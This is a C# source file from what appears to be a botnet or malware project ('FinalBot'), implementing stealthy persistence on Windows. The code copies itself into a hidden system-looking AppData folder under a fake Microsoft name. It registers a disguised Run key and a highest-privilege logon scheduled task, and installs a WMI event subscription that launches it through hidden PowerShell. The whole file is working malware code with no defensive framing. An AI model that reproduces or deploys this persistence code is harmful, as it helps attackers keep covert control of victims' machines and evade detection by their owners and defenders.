using System;
using System.IO;
using System.Diagnostics;
using System.Management;
using Microsoft.Win32;
using VanguardCore;

namespace FinalBot
{
    public static class Persistence
    {
        public static void Install()
        {
            try
            {
                string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(selfPath)) return;

                // Drop to hidden system-looking directory
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string targetDir = Path.Combine(appData, "Microsoft", "Protect");
                string targetPath = Path.Combine(targetDir, "RuntimeBrokerXX.exe");

                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);

                if (selfPath != targetPath)
                {
                    File.Copy(selfPath, targetPath, true);
                    File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                }

                // Method 1: Registry Run Key
                try
                {
                    using RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    key?.SetValue("SecurityHealthSvcHost", $"\"{targetPath}\"");
                }
                catch { }

                // Method 2: Scheduled Task (runs at logon with highest priv)
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "schtasks",
                        Arguments = $"/create /tn \"MicrosoftUpdateBroker\" /tr \"\\\"{targetPath}\\\"\" /sc onlogon /rl highest /f",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    });
                }
                catch { }

                // Method 3: WMI Event Subscription (invisible, survives registry scans)
                InstallWMI(targetPath);

                Logger.Info("[PERSISTENCE] All methods installed.");
            }
            catch (Exception ex)
            {
                Logger.Error("Persistence installation failed", ex);
            }
        }

        private static void InstallWMI(string exePath)
        {
            try
            {
                var scope = new ManagementScope(@"\\.\root\subscription");
                scope.Connect();

                // 1. EventFilter — trigger when explorer.exe starts (user just logged on)
                var filterPath = new ManagementPath("__EventFilter");
                using var filter = new ManagementClass(scope, filterPath, null).CreateInstance();
                filter["Name"] = "MSUpdateFilter";
                filter["QueryLanguage"] = "WQL";
                filter["Query"] = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'";
                filter.Put();

                // 2. CommandLineEventConsumer — silently run our exe
                var consumerPath = new ManagementPath("CommandLineEventConsumer");
                using var consumer = new ManagementClass(scope, consumerPath, null).CreateInstance();
                consumer["Name"] = "MSUpdateConsumer";
                consumer["CommandLineTemplate"] = $"powershell.exe -windowstyle hidden -command \"& '{exePath}'\"";
                consumer.Put();

                // 3. Bind filter → consumer
                var bindingPath = new ManagementPath("__FilterToConsumerBinding");
                using var binding = new ManagementClass(scope, bindingPath, null).CreateInstance();
                binding["Filter"] = filter.Path.RelativePath;
                binding["Consumer"] = consumer.Path.RelativePath;
                binding.Put();

                Logger.Info("[PERSISTENCE] WMI Event Subscription installed.");
            }
            catch (Exception ex)
            {
                Logger.Warn($"[PERSISTENCE] WMI failed (need admin): {ex.Message}");
            }
        }

        public static void Uninstall()
        {
            try
            {
                using RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key?.DeleteValue("SecurityHealthSvcHost", false);
            }
            catch { }
        }
    }
}
